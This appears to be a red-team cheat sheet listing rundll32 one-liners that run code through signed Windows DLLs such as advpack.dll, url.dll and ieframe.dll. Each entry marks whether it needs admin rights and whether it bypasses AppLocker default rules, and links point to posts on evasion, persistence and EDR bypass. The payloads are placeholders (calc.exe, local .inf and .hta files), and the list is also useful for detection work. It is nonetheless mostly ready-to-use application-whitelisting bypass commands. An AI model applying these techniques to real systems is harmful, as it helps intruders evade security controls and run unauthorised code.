A list of some DLL execution methods. Can be useful in some scenarioes.  

## Advpack.dll - LaunchINFSection

```
rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,
```

* Requires admin: No  
* Windows binary: Yes  
* Bypasses AppLocker Default rules: Yes

Notes:


* Links:
  * https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
  * https://twitter.com/bohops/status/967486047839014913    
  * https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf
  
  
  
## Advpack.dll - RegisterOCX

```
rundll32.exe advpack.dll,RegisterOCX calc.exe
```

* Requires admin: No
* Windows binary: Yes
* Bypasses AppLocker Default rules: Yes

Notes:


* Links:
  * https://twitter.com/Moriarty_Meng/status/977848311603380224
  
  
  
## zipfldr.dll - RouteTheCall

```
rundll32.exe zipfldr.dll,RouteTheCall calc.exe
```

* Requires admin: No
* Windows binary: Yes
* Bypasses AppLocker Default rules: Yes

Notes:


* Links:
  * https://twitter.com/Moriarty_Meng/status/977848311603380224
  
  
  
## url.dll - OpenURL

```
rundll32.exe url.dll,OpenURL "C:\test\calc.hta"
rundll32.exe url.dll,OpenURL "C:\test\calc.url"
```

* Requires admin: No
* Windows binary: Yes
* Bypasses AppLocker Default rules: ?

Notes:


* Links:
  * https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/
  * http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/
  
  
  
## url.dll - FileProtocolHandler

```
rundll32.exe url.dll, FileProtocolHandler calc.exe
```

* Requires admin: No
* Windows binary: Yes
* Bypasses AppLocker Default rules: ?

Notes:


* Links:
  * http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/
  
  
  
## ieframe.dll - OpenURL

```
rundll32.exe ieframe.dll,OpenURL "C:\test\calc.url"
```

* Requires admin: No
* Windows binary: Yes
* Bypasses AppLocker Default rules: ?

Notes:


* Links:
  * https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/
  * http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/
  
  
  
## shdocvw.dll - OpenURL

```
rundll32.exe shdocvw.dll,OpenURL "C:\test\calc.url"
```

* Requires admin: No
* Windows binary: Yes
* Bypasses AppLocker Default rules: ?

Notes:


* Links:
  * https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/
  * http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/
  
  
  
## ieadvpack.dll - LaunchINFSection

```
rundll32.exe ieadvpack.dll,LaunchINFSection test.inf,,1,
```

* Requires admin: No
* Windows binary: Yes
* Bypasses AppLocker Default rules: ?

Notes:


* Links:
  * https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/